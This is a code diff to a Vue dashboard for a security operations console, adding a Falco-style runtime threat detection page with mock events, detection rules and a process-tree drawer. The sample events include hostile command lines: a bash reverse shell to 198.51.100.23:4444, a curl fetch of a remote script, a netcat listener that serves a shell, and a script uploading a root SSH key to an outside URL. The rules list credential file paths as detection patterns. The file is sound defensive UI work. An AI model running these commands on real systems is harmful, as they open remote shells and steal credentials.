@@ -41,6 +41,8 @@ const selectedType = ref('全部类型');
 const selectedLevel = ref('全部等级');
 const selectedStatus = ref('全部状态');
 const activeBehaviorLayer = ref('全部');
+const selectedBehaviorEventId = ref('FB-9001');
+const behaviorDrawerOpen = ref(false);
 const selectedAlertId = ref('AG-1001');
 const selectedRows = ref<string[]>(['AG-1002']);
 const alertDrawerOpen = ref(false);
@@ -142,18 +144,28 @@ const behaviorCategories = [
 ];
 
 const behaviorEvents = [
-  { id: 'FB-9001', time: '2026-05-08 10:24:18', layer: '容器安全', vector: '容器内 shell 会话创建', asset: 'namespace/pay-prod · pod/pay-api-6d79', rule: 'Falco: Terminal shell in container', level: '高危' as Severity, evidence: 'proc.name=bash user=root container.image=pay-api:v2.7 command=bash -i', action: '已隔离 Pod 并保留容器快照' },
-  { id: 'FB-9002', time: '2026-05-08 10:21:06', layer: '容器安全', vector: '容器内安装新软件包', asset: 'namespace/data-prod · pod/etl-worker-0', rule: 'Falco: Package management launched in container', level: '中危' as Severity, evidence: 'proc.name=apt-get evt.type=execve user=app path=/usr/bin/apt-get', action: '已触发镜像漂移复核' },
-  { id: 'FB-9003', time: '2026-05-08 10:17:45', layer: '主机安全', vector: '敏感目录写入', asset: 'node-cn-bj-ecs-03', rule: 'Falco: Write below binary dir', level: '高危' as Severity, evidence: 'fd.name=/usr/bin/.cache/kswapd proc.name=sh user=root', action: '已收敛节点污点并发起 EDR 扫描' },
-  { id: 'FB-9004', time: '2026-05-08 10:13:52', layer: '网络威胁', vector: '意外端口监听', asset: 'namespace/ops · pod/debug-toolbox', rule: 'Falco: Unexpected listening port', level: '中危' as Severity, evidence: 'fd.sport=4444 proc.name=nc container.id=8f42d1', action: '已阻断安全组入站并通知负责人' },
-  { id: 'FB-9005', time: '2026-05-08 10:09:39', layer: '敏感数据保护', vector: 'SSH 私钥读取', asset: 'node-cn-tj-host-11', rule: 'Falco: Read sensitive file trusted after startup', level: '高危' as Severity, evidence: 'fd.name=/root/.ssh/id_rsa proc.name=python3 user=root', action: '已冻结访问令牌并生成凭证轮换工单' },
+  {
+    id: 'FB-9001', time: '2026-05-08 10:24:18', layer: '容器安全', vector: '容器内 shell 会话创建', asset: 'namespace/pay-prod · pod/pay-api-6d79', rule: 'Terminal shell in container', level: '高危' as Severity, evidence: 'proc.name=bash user=root container.image=registry.local/pay-api:v2.7 command=bash -i', action: '已隔离 Pod 并保留容器快照', status: '阻断中', confidence: 98, owner: '支付业务组', node: 'node-cn-bj-cce-03', namespace: 'pay-prod', pod: 'pay-api-6d79c8d9f4-k2x7q', containerId: 'cri-o://8f42d1c3b7e9', image: 'registry.local/pay-api:v2.7@sha256:9f31c4', runtime: 'containerd 1.7.18', user: 'root', pid: 18422, parentPid: 18290, parentProcess: 'nginx: worker process', childProcesses: ['bash -i', 'cat /etc/passwd', 'curl 198.51.100.23/p.sh'], commandLine: 'bash -i >& /dev/tcp/198.51.100.23/4444 0>&1', cwd: '/app', tty: 'pts/0', processTree: [{ name: 'containerd-shim', pid: 18110, depth: 0 }, { name: 'nginx: worker process', pid: 18290, depth: 1 }, { name: 'bash -i', pid: 18422, depth: 2 }, { name: 'curl 198.51.100.23/p.sh', pid: 18431, depth: 3 }], evidenceFields: ['evt.type=execve', 'container.id=8f42d1c3b7e9', 'proc.name=bash', 'user.name=root', 'fd.rip=198.51.100.23'], suggestion: '立即隔离 Pod，保留容器快照，核查镜像入口脚本与最近一次发布差异。'
+  },
+  {
+    id: 'FB-9002', time: '2026-05-08 10:21:06', layer: '容器安全', vector: '容器内安装新软件包', asset: 'namespace/data-prod · pod/etl-worker-0', rule: 'Package management launched in container', level: '中危' as Severity, evidence: 'proc.name=apt-get evt.type=execve user=app path=/usr/bin/apt-get', action: '已触发镜像漂移复核', status: '待复核', confidence: 87, owner: '数据平台组', node: 'node-cn-sh-cce-07', namespace: 'data-prod', pod: 'etl-worker-0', containerId: 'containerd://31ad92f00ab1', image: 'registry.local/etl-worker:1.18.3@sha256:2aa78d', runtime: 'containerd 1.7.18', user: 'app', pid: 22791, parentPid: 22718, parentProcess: 'python /jobs/runner.py', childProcesses: ['apt-get update', 'dpkg --configure -a'], commandLine: 'apt-get update && apt-get install -y netcat-openbsd', cwd: '/jobs', tty: '-', processTree: [{ name: 'python /jobs/runner.py', pid: 22718, depth: 0 }, { name: 'sh -c apt-get update', pid: 22788, depth: 1 }, { name: 'apt-get update', pid: 22791, depth: 2 }, { name: 'dpkg --configure -a', pid: 22810, depth: 2 }], evidenceFields: ['proc.name=apt-get', 'evt.arg.path=/usr/bin/apt-get', 'container.image=etl-worker:1.18.3', 'user.name=app'], suggestion: '比对镜像 SBOM 与运行时包清单，确认是否存在调试工具或反向连接工具落地。'
+  },
+  {
+    id: 'FB-9003', time: '2026-05-08 10:17:45', layer: '主机安全', vector: '敏感目录写入', asset: 'node-cn-bj-ecs-03', rule: 'Write below binary dir', level: '高危' as Severity, evidence: 'fd.name=/usr/bin/.cache/kswapd proc.name=sh user=root', action: '已收敛节点污点并发起 EDR 扫描', status: '处置中', confidence: 96, owner: '基础设施组', node: 'node-cn-bj-ecs-03', namespace: '-', pod: '-', containerId: '-', image: 'host-process', runtime: 'host', user: 'root', pid: 3981, parentPid: 3978, parentProcess: 'sshd: root@pts/2', childProcesses: ['cp /tmp/kswapd /usr/bin/.cache/kswapd', 'chmod 755 /usr/bin/.cache/kswapd'], commandLine: 'sh -c cp /tmp/kswapd /usr/bin/.cache/kswapd && chmod 755 /usr/bin/.cache/kswapd', cwd: '/tmp', tty: 'pts/2', processTree: [{ name: 'sshd: root@pts/2', pid: 3978, depth: 0 }, { name: 'sh -c cp /tmp/kswapd ...', pid: 3981, depth: 1 }, { name: 'cp /tmp/kswapd /usr/bin/.cache/kswapd', pid: 3984, depth: 2 }, { name: 'chmod 755 /usr/bin/.cache/kswapd', pid: 3987, depth: 2 }], evidenceFields: ['fd.directory=/usr/bin', 'evt.type=open_write', 'user.uid=0', 'proc.pname=sshd'], suggestion: '对节点执行隔离与文件哈希提取，核查登录来源、sudo 审计和持久化项。'
+  },
+  {
+    id: 'FB-9004', time: '2026-05-08 10:13:52', layer: '网络威胁', vector: '意外端口监听', asset: 'namespace/ops · pod/debug-toolbox', rule: 'Unexpected listening port', level: '中危' as Severity, evidence: 'fd.sport=4444 proc.name=nc container.id=8f42d1', action: '已阻断安全组入站并通知负责人', status: '已阻断', confidence: 91, owner: '运维工具组', node: 'node-cn-gz-cce-02', namespace: 'ops', pod: 'debug-toolbox-6f9d44', containerId: 'containerd://8f42d1ad003e', image: 'registry.local/debug-toolbox:2026.05@sha256:bb8021', runtime: 'containerd 1.7.18', user: 'ops', pid: 11203, parentPid: 11191, parentProcess: 'sh', childProcesses: ['nc -lvnp 4444'], commandLine: 'nc -lvnp 4444 -e /bin/sh', cwd: '/workspace', tty: 'pts/1', processTree: [{ name: 'kubectl exec session', pid: 11182, depth: 0 }, { name: 'sh', pid: 11191, depth: 1 }, { name: 'nc -lvnp 4444', pid: 11203, depth: 2 }], evidenceFields: ['evt.type=listen', 'fd.sport=4444', 'proc.name=nc', 'container.name=debug-toolbox'], suggestion: '收敛调试容器权限，关闭临时监听端口，并检查是否存在外部连接回连。'
+  },
+  {
+    id: 'FB-9005', time: '2026-05-08 10:09:39', layer: '敏感数据保护', vector: 'SSH 私钥读取', asset: 'node-cn-tj-host-11', rule: 'Read sensitive credential file', level: '高危' as Severity, evidence: 'fd.name=/root/.ssh/id_rsa proc.name=python3 user=root', action: '已冻结访问令牌并生成凭证轮换工单', status: '已生成工单', confidence: 94, owner: '平台安全组', node: 'node-cn-tj-host-11', namespace: '-', pod: '-', containerId: '-', image: 'host-process', runtime: 'host', user: 'root', pid: 6209, parentPid: 6202, parentProcess: 'python3 /opt/scripts/collect.py', childProcesses: ['open /root/.ssh/id_rsa', 'POST https://api.example.net/upload'], commandLine: 'python3 /opt/scripts/collect.py --path /root/.ssh/id_rsa --target https://api.example.net/upload', cwd: '/opt/scripts', tty: '-', processTree: [{ name: 'crond', pid: 996, depth: 0 }, { name: 'python3 /opt/scripts/collect.py', pid: 6202, depth: 1 }, { name: 'open /root/.ssh/id_rsa', pid: 6209, depth: 2 }, { name: 'https upload worker', pid: 6216, depth: 2 }], evidenceFields: ['fd.name=/root/.ssh/id_rsa', 'evt.type=open_read', 'proc.name=python3', 'fd.rip=203.0.113.45'], suggestion: '立即轮换 SSH 密钥与相关 API 凭证，排查脚本来源并补充敏感文件访问白名单。'
+  },
 ];
 
 const behaviorRules = [
-  { rule: 'Terminal shell in container', layer: '容器安全', severity: '高危' as Severity, condition: 'container.id exists and proc.name in (bash, sh, zsh)', scope: '生产命名空间', status: '阻断+告警' },
-  { rule: 'Write below etc or binary dir', layer: '主机安全', severity: '高危' as Severity, condition: 'fd.directory in (/etc, /usr/bin, /usr/sbin) and evt.type in (open_write, chmod, chown)', scope: '全部宿主机', status: '告警+快照' },
-  { rule: 'Unexpected outbound connection', layer: '网络威胁', severity: '中危' as Severity, condition: 'not fd.sip in approved_cidrs and fd.type=ipv4', scope: '出口网关与 Pod', status: '告警+联动防火墙' },
-  { rule: 'Read sensitive credential file', layer: '敏感数据', severity: '高危' as Severity, condition: 'fd.name in (/etc/shadow, /etc/passwd, ~/.ssh/*, /var/run/secrets/*)', scope: '节点与容器', status: '阻断+凭证轮换' },
+  { rule: 'Terminal shell in container', layer: '容器安全', severity: '高危' as Severity, condition: 'container.id exists and proc.name in (bash, sh, zsh)', scope: '生产命名空间', status: '阻断+告警', hits: 142, coverage: '生产 Pod 98%' },
+  { rule: 'Write below etc or binary dir', layer: '主机安全', severity: '高危' as Severity, condition: 'fd.directory in (/etc, /usr/bin, /usr/sbin) and evt.type in (open_write, chmod, chown)', scope: '全部宿主机', status: '告警+快照', hits: 96, coverage: '宿主机 100%' },
+  { rule: 'Unexpected outbound connection', layer: '网络威胁', severity: '中危' as Severity, condition: 'not fd.sip in approved_cidrs and fd.type=ipv4', scope: '出口网关与 Pod', status: '告警+联动防火墙', hits: 121, coverage: '出口链路 93%' },
+  { rule: 'Read sensitive credential file', layer: '敏感数据保护', severity: '高危' as Severity, condition: 'fd.name in (/etc/shadow, /etc/passwd, ~/.ssh/*, /var/run/secrets/*)', scope: '节点与容器', status: '阻断+凭证轮换', hits: 67, coverage: '敏感路径 100%' },
 ];
 
 const alerts = ref([
@@ -261,6 +273,7 @@ const filteredAlerts = computed(() => alerts.value.filter((item) => {
   return matchScenario && matchType && matchLevel && matchStatus && matchKeyword;
 }));
 const filteredBehaviorEvents = computed(() => behaviorEvents.filter((item) => activeBehaviorLayer.value === '全部' || item.layer === activeBehaviorLayer.value));
+const selectedBehaviorEvent = computed(() => behaviorEvents.find((item) => item.id === selectedBehaviorEventId.value) || behaviorEvents[0]);
 
 const filteredIntelligence = computed(() => intelligence.value.filter((item) => {
   const keyword = intelligenceQuery.value.trim().toLowerCase();
@@ -388,6 +401,19 @@ function drillTopologyNode(id: string) {
 function topologyNodeClass(id: string) {
   const node = topologyNodes.find((item) => item.id === id);
   return ['topology-node', { active: selectedTopologyNodeId.value === id, high: node?.risk === '高危', medium: node?.risk === '中危' }];
+}
+
+function openBehaviorEvent(id: string) {
+  selectedBehaviorEventId.value = id;
+  behaviorDrawerOpen.value = true;
+  showToast(`已打开威胁行为检测事件 ${id} 的运行时证据`);
+}
+
+function behaviorLayerClass(layer: string) {
+  if (layer === '容器安全') return 'layer container';
+  if (layer === '主机安全') return 'layer host';
+  if (layer === '网络威胁') return 'layer network';
+  return 'layer data';
 }
 
 function goTrace(id: string) {
@@ -652,53 +678,34 @@ function testSmtp() {
         </div>
       </section>
 
-<section v-if="activePage === 'behavior'" class="page-stack threat-behavior-page">
-        <div class="behavior-hero panel">
-          <div>
-            <p class="eyebrow">Falco Runtime Threat Detection</p>
-            <h3>威胁行为检测工作台</h3>
-            <p>在流量监测之外，补充对云原生运行时行为的持续检测，形成“容器—主机—网络—敏感数据”的多层攻击向量识别能力。</p>
-          </div>
-          <div class="behavior-summary">
-            <span>检测引擎</span><strong>Falco 风格规则</strong><small>Syscall / K8s Audit / Network Context</small>
-          </div>
+<section v-if="activePage === 'behavior'" class="page-stack threat-behavior-page formal-behavior-page">
+        <div class="soc-header-card">
+          <div class="soc-header-main"><span class="soc-kicker"><AppIcon name="behavior" size="16" /> Falco Runtime Detection</span><h2>威胁行为检测</h2><p>基于容器运行时、宿主机系统调用、网络连接与敏感文件访问证据，识别云原生环境中的异常进程、横向移动、违规外联和凭证访问风险。</p></div>
+          <div class="soc-header-actions"><button class="white-button" @click="showToast('已刷新威胁行为检测事件与规则命中统计')"><AppIcon name="refresh" size="15" /> 刷新事件</button><button class="blue-button" @click="showToast('已下发 Falco 规则同步任务')"><AppIcon name="rules" size="15" /> 同步规则</button><button class="white-button" @click="showToast('已导出威胁行为检测证据包')"><AppIcon name="download" size="15" /> 导出证据</button></div>
         </div>
 
-        <div class="behavior-stat-grid">
-          <article v-for="stat in behaviorStats" :key="stat.label" :data-tone="stat.tone">
-            <span><AppIcon :name="stat.icon" :label="stat.label" /></span>
-            <div><p>{{ stat.label }}</p><strong>{{ stat.value }}</strong><em>{{ stat.delta }}</em></div>
-          </article>
+        <div class="behavior-kpi-grid formal-kpis">
+          <article v-for="stat in behaviorStats" :key="stat.label" :data-tone="stat.tone"><span><AppIcon :name="stat.icon" :label="stat.label" /></span><div><p>{{ stat.label }}</p><strong>{{ stat.value }}</strong><em>{{ stat.delta }}</em></div></article>
         </div>
 
-        <div class="behavior-category-grid">
-          <article v-for="category in behaviorCategories" :key="category.title" class="behavior-category panel">
-            <div class="category-head">
-              <span><AppIcon :name="category.icon" :label="category.title" /></span>
-              <div><h3>{{ category.title }}</h3><p>{{ category.focus }}</p></div>
-              <b :class="levelClass(category.risk)">{{ category.risk }}</b>
-            </div>
-            <p class="category-desc">{{ category.desc }}</p>
-            <div class="vector-list"><button v-for="vector in category.vectors" :key="vector" @click="showToast('已按攻击向量联动筛选：' + vector)">{{ vector }}</button></div>
-            <div class="category-foot"><span>近 24h 命中</span><strong>{{ category.hits }}</strong></div>
-          </article>
-        </div>
-
-        <div class="behavior-main-grid">
-          <section class="table-card behavior-event-card">
-            <div class="table-toolbar behavior-toolbar"><div><button class="blue-button" @click="showToast('已下发威胁行为检测规则同步任务')">同步规则</button><button class="white-button" @click="showToast('已导出威胁行为事件证据包')">导出证据</button></div><div class="behavior-layer-tabs"><button v-for="layer in ['全部', '容器安全', '主机安全', '网络威胁', '敏感数据保护']" :key="layer" class="mini" :class="{ active: activeBehaviorLayer === layer }" @click="activeBehaviorLayer = layer">{{ layer }}</button></div><span class="hint-inline">按运行时证据、资产对象和处置动作串联审计闭环</span></div>
-            <table class="data-table behavior-table"><thead><tr><th>事件ID</th><th>时间</th><th>检测层面</th><th>攻击向量</th><th>资产对象</th><th>规则</th><th>等级</th><th>关键证据</th><th>处置状态</th></tr></thead><tbody><tr v-for="event in filteredBehaviorEvents" :key="event.id"><td><strong>{{ event.id }}</strong></td><td>{{ event.time }}</td><td>{{ event.layer }}</td><td>{{ event.vector }}</td><td>{{ event.asset }}</td><td>{{ event.rule }}</td><td><span :class="levelClass(event.level)">{{ event.level }}</span></td><td class="param code-evidence">{{ event.evidence }}</td><td>{{ event.action }}</td></tr></tbody></table>
-          </section>
-
-          <aside class="panel behavior-rule-panel">
-            <div class="panel-title"><h3>检测规则覆盖</h3><button @click="setPage('rules')">进入规则管理</button></div>
-            <div v-for="rule in behaviorRules" :key="rule.rule" class="behavior-rule-row">
-              <div><b>{{ rule.rule }}</b><span>{{ rule.layer }} · {{ rule.scope }}</span></div>
-              <p>{{ rule.condition }}</p>
-              <footer><span :class="levelClass(rule.severity)">{{ rule.severity }}</span><em>{{ rule.status }}</em></footer>
-            </div>
+        <div class="behavior-workbench">
+          <aside class="behavior-rule-sidebar panel">
+            <div class="panel-title-row"><h3>检测层面</h3><span>{{ filteredBehaviorEvents.length }} 条事件</span></div>
+            <button v-for="layer in ['全部', '容器安全', '主机安全', '网络威胁', '敏感数据保护']" :key="layer" class="layer-filter" :class="{ active: activeBehaviorLayer === layer }" @click="activeBehaviorLayer = layer"><span :class="behaviorLayerClass(layer)"><AppIcon :name="iconFor(layer)" size="17" /></span><b>{{ layer }}</b><em>{{ layer === '全部' ? behaviorEvents.length : behaviorEvents.filter((item) => item.layer === layer).length }}</em></button>
+            <div class="coverage-box"><h4>规则覆盖状态</h4><p>当前生产命名空间、宿主机节点、出口网关和敏感路径均已纳入检测策略，支持告警、阻断、快照与工单联动。</p></div>
           </aside>
+
+          <section class="behavior-main-column">
+            <div class="behavior-filter-card panel">
+              <div class="filter-title"><strong>事件检索</strong><span>按运行时证据、资产对象、规则命中和处置状态串联审计闭环</span></div>
+              <div class="filter-controls"><select><option>全部等级</option><option>高危</option><option>中危</option><option>低危</option></select><select><option>全部状态</option><option>阻断中</option><option>处置中</option><option>待复核</option></select><input placeholder="搜索事件ID、Pod、节点、进程、命令行或镜像"/><button class="blue-button" @click="showToast('已按威胁行为检测条件刷新事件列表')">查询</button><button class="white-button" @click="activeBehaviorLayer = '全部'">重置</button></div>
+            </div>
+
+            <div class="table-card behavior-event-card"><div class="table-title-row"><div><h3>威胁行为事件</h3><p>点击“详情”查看进程树、父子进程、命令行参数与容器镜像上下文。</p></div><span class="tag info">Falco 运行时证据</span></div><table class="data-table behavior-table formal-table"><thead><tr><th>事件ID</th><th>发生时间</th><th>检测层面</th><th>攻击向量</th><th>资产对象</th><th>进程 / 用户</th><th>规则</th><th>等级</th><th>状态</th><th>操作</th></tr></thead><tbody><tr v-for="event in filteredBehaviorEvents" :key="event.id" :class="{ selected: selectedBehaviorEventId === event.id }"><td><strong>{{ event.id }}</strong><small>{{ event.confidence }}% 置信</small></td><td>{{ event.time }}</td><td><span :class="behaviorLayerClass(event.layer)">{{ event.layer }}</span></td><td>{{ event.vector }}</td><td><b>{{ event.asset }}</b><small>{{ event.node }}</small></td><td><span class="process-cell">{{ event.parentProcess }} → {{ event.pid }}</span><small>{{ event.user }}</small></td><td>{{ event.rule }}</td><td><span :class="levelClass(event.level)">{{ event.level }}</span></td><td><span class="tag warning">{{ event.status }}</span></td><td class="ops"><button @click="openBehaviorEvent(event.id)">详情</button><button @click="showToast('事件 ' + event.id + ' 已加入处置队列')">处置</button></td></tr></tbody></table></div>
+          </section>
         </div>
+
+        <div class="behavior-rule-board panel"><div class="panel-title-row"><h3>Falco 检测规则覆盖</h3><button class="white-button" @click="showToast('已进入 Falco 规则灰度发布流程')">规则灰度发布</button></div><div class="rule-matrix"><article v-for="rule in behaviorRules" :key="rule.rule" class="rule-matrix-card"><div><span :class="behaviorLayerClass(rule.layer)">{{ rule.layer }}</span><strong>{{ rule.rule }}</strong><em>{{ rule.coverage }}</em></div><p>{{ rule.condition }}</p><footer><span :class="levelClass(rule.severity)">{{ rule.severity }}</span><span>{{ rule.scope }}</span><span>{{ rule.status }}</span><b>{{ rule.hits }} 次</b></footer></article></div></div>
       </section>
 
       <section v-if="activePage === 'intelligence'" class="page-stack">
@@ -785,6 +792,9 @@ function testSmtp() {
 
       <section v-if="activePage === 'warning'" class="page-stack"><div class="tab-strip"><button v-for="tab in ['邮件通知','邮件列表','邮件服务器配置']" :key="tab" :class="{ active: activeWarningTab === tab }" @click="activeWarningTab = tab as WarningTab; showToast(`已切换威胁预警子模块：${tab}`)"><span class="sub-icon"><AppIcon :name="iconFor(tab)" :label="tab" /></span>{{ tab }}</button></div><div v-if="activeWarningTab === '邮件服务器配置'" class="mail-card panel"><div class="form-row required"><label>发送服务器/SMTP服务器：</label><input placeholder="输入发送服务器"/><label class="check"><input type="checkbox"/> SSL端口</label><input placeholder="输入端口"/><button class="blue-button" @click="testSmtp">{{ smtpTesting ? '测试中...' : '测试连通性' }}</button></div><div class="hint-bar">电子邮件的发送服务器，可以填写内部搭建的邮件服务器地址或外网发送地址</div><div class="form-row required"><label>发送Email账号：</label><input placeholder="输入发送Email地址"/></div><div class="hint-bar">能够登录该电子邮件的服务器 Email 账号</div><div class="form-row required"><label>发送Email密码：</label><input placeholder="输入发送Email密码" type="password"/><button class="eye" aria-label="查看密码"><AppIcon name="eye" size="16" /></button></div><div class="hint-bar">能够登录该电子邮件的服务器 Email 密码</div><div class="form-row required"><label>发送邮件：</label><input placeholder="输入发送人邮件"/></div><div class="hint-bar">作为发送该威胁邮件的发送人邮件</div><div class="form-row required"><label>发送人名称：</label><input placeholder="输入发送人名称"/></div><div class="hint-bar">该威胁邮件的显示的发送人名称</div><div class="form-row required"><label>接收邮件：</label><input placeholder="接收人邮件，输入多个换行"/></div><div class="hint-bar">接收该威胁邮件的接收邮件，多个接收邮件用；分隔</div><div class="form-row"><label>邮件主题：</label><input placeholder="输入邮件主题"/></div><div class="mail-actions"><button class="green-button" @click="saveWarningConfig('测试并提交邮件服务器配置')">测试并提交配置</button><button class="red-button" @click="confirmAction = { title: '删除邮件服务器配置', content: '确认删除当前 SMTP 配置？删除后威胁预警邮件将暂停发送。', onConfirm: () => saveWarningConfig('删除邮件服务器配置') }">删除配置</button></div></div><div v-else-if="activeWarningTab === '邮件通知'" class="panel notice-config"><h3>邮件通知策略</h3><label class="switch-line">高危告警实时发送 <input type="checkbox" v-model="mailEnabled" /></label><label class="switch-line">中低危告警按小时汇总 <input type="checkbox" checked /></label><label class="switch-line">溯源报告生成后发送附件 <input type="checkbox" checked /></label></div><div v-else class="table-card"><table class="data-table"><thead><tr><th>序号</th><th>接收人</th><th>部门</th><th>接收等级</th><th>状态</th><th>操作</th></tr></thead><tbody><tr><td>1</td><td>secops@example.com</td><td>安全运营中心</td><td>高危/中危</td><td><span class="tag success">启用</span></td><td class="ops"><button>编辑</button><button>删除</button></td></tr><tr><td>2</td><td>auditor@example.com</td><td>审计组</td><td>高危</td><td><span class="tag info">停用</span></td><td class="ops"><button>编辑</button><button>删除</button></td></tr></tbody></table></div></section>
     </main>
+
+    
+    <aside v-if="behaviorDrawerOpen" class="drawer behavior-detail-drawer"><button class="drawer-close" @click="behaviorDrawerOpen = false">×</button><div class="drawer-heading"><span :class="behaviorLayerClass(selectedBehaviorEvent.layer)"><AppIcon :name="iconFor(selectedBehaviorEvent.layer)" size="18" /> {{ selectedBehaviorEvent.layer }}</span><h3>威胁行为检测事件：{{ selectedBehaviorEvent.id }}</h3><p>{{ selectedBehaviorEvent.vector }} · {{ selectedBehaviorEvent.time }} · 置信度 {{ selectedBehaviorEvent.confidence }}%</p></div><div class="detail-grid compact"><dl><dt>资产对象</dt><dd>{{ selectedBehaviorEvent.asset }}</dd><dt>命名空间 / Pod</dt><dd>{{ selectedBehaviorEvent.namespace }} / {{ selectedBehaviorEvent.pod }}</dd><dt>节点</dt><dd>{{ selectedBehaviorEvent.node }}</dd><dt>负责人</dt><dd>{{ selectedBehaviorEvent.owner }}</dd></dl><dl><dt>容器镜像</dt><dd class="mono-break">{{ selectedBehaviorEvent.image }}</dd><dt>容器 ID</dt><dd class="mono-break">{{ selectedBehaviorEvent.containerId }}</dd><dt>运行时</dt><dd>{{ selectedBehaviorEvent.runtime }}</dd><dt>当前状态</dt><dd><span class="tag warning">{{ selectedBehaviorEvent.status }}</span></dd></dl></div><section class="drawer-section"><h4>进程树</h4><div class="process-tree"><div v-for="node in selectedBehaviorEvent.processTree" :key="node.pid + '-' + node.name" class="process-node" :style="{ '--depth': node.depth }"><span>{{ node.pid }}</span><b>{{ node.name }}</b></div></div></section><section class="drawer-section"><h4>父子进程关系</h4><div class="process-relation"><article><span>父进程</span><strong>{{ selectedBehaviorEvent.parentProcess }}</strong><em>PPID {{ selectedBehaviorEvent.parentPid }}</em></article><article><span>当前进程</span><strong>{{ selectedBehaviorEvent.commandLine }}</strong><em>PID {{ selectedBehaviorEvent.pid }} · {{ selectedBehaviorEvent.user }}</em></article><article><span>子进程</span><strong>{{ selectedBehaviorEvent.childProcesses.join('；') }}</strong><em>工作目录 {{ selectedBehaviorEvent.cwd }} · TTY {{ selectedBehaviorEvent.tty }}</em></article></div></section><section class="drawer-section"><h4>命令行参数</h4><pre class="command-block">{{ selectedBehaviorEvent.commandLine }}</pre></section><section class="drawer-section"><h4>Falco 证据字段</h4><div class="evidence-chip-list"><span v-for="field in selectedBehaviorEvent.evidenceFields" :key="field">{{ field }}</span></div></section><div class="suggestion-box">{{ selectedBehaviorEvent.suggestion }}</div><div class="drawer-actions"><button class="blue-button" @click="showToast('已创建 ' + selectedBehaviorEvent.id + ' 处置工单')">创建处置工单</button><button class="white-button" @click="activeTraceTab = '资产关联关系'; setPage('trace'); behaviorDrawerOpen = false">关联溯源分析</button><button class="red-button" @click="showToast(selectedBehaviorEvent.asset + ' 已加入临时隔离策略')">隔离资产</button></div></aside>
 
     <aside v-if="alertDrawerOpen" class="drawer"><button class="drawer-close" @click="alertDrawerOpen = false">×</button><h3>告警详情：{{ selectedAlert.id }}</h3><p>{{ selectedAlert.attackType }} 命中 {{ selectedAlert.targetAsset }}</p><dl><dt>源 IP</dt><dd>{{ selectedAlert.sourceIp }} · {{ selectedAlert.sourceGeo }}</dd><dt>目的 IP</dt><dd>{{ selectedAlert.targetIp }}</dd><dt>详细参数</dt><dd>{{ selectedAlert.detail }}</dd><dt>置信度</dt><dd>{{ selectedAlert.confidence }}%</dd></dl><div class="drawer-actions"><button class="blue-button" @click="goTrace(selectedAlert.id)">进入溯源分析</button><button class="white-button" @click="openAddIntelligence(selectedAlert.sourceIp)">加情报</button><button class="red-button" @click="handleAlertAction(selectedAlert.id, '阻断隔离')">阻断隔离</button></div></aside>
 
